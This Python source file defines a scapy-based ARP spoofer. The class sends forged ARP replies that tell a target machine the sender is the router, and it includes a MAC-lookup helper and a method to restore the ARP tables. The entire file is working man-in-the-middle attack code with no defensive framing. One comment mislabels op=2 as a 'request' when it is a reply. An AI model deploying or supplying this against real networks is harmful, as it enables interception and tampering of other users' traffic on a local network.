import scapy.all as scapy
from scapy.layers.l2 import ARP,Ether



class Spoofer:
    def __init__(self,host_ip,target_ip,router_ip) -> None:
        self.__ip = host_ip
        self.__target_ip = target_ip
        self.__router_ip = router_ip

    def spoof(self): # Main
        """sending spoofed packet.
        """
        # getting the MAC of the target
        target_mac = self.get_mac(self.__target_ip)
        # generating the spoofed packet modifying the source and the target
        packet = ARP(op=2, # request
                        hwdst=target_mac, # mac destination - target mac
                        pdst=self.__target_ip, # ip destination
                    psrc=self.__router_ip) # ip source
        # This packet is saying - I am the router.

        # sending the packet
        scapy.send(packet, verbose=False)

            
    
    def checkout(self):
        """stop spoofing.
        """
        self.restore_defaults(self.__target_ip,self.__ip)
    
    def restore_defaults(self,dest, source):
        # getting the real MACs
        target_mac = self.get_mac(dest) # 1st (router), then (windows)
        source_mac = self.get_mac(source)
        # creating the packet
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        # sending the packet
        scapy.send(packet, verbose=False)

    def get_mac(self,ip: str):
        """Get mac of the router using actual ARP.

        Args:
            ip (str): ipv4 of the target.

        Returns:
            mac address of the target.
        """
        # request that contain the IP destination of the target
        # broadcast packet creation
        final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        # getting the response
        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
        # getting the MAC (its src because its a response)
        mac = answer[0][1].hwsrc
        return mac


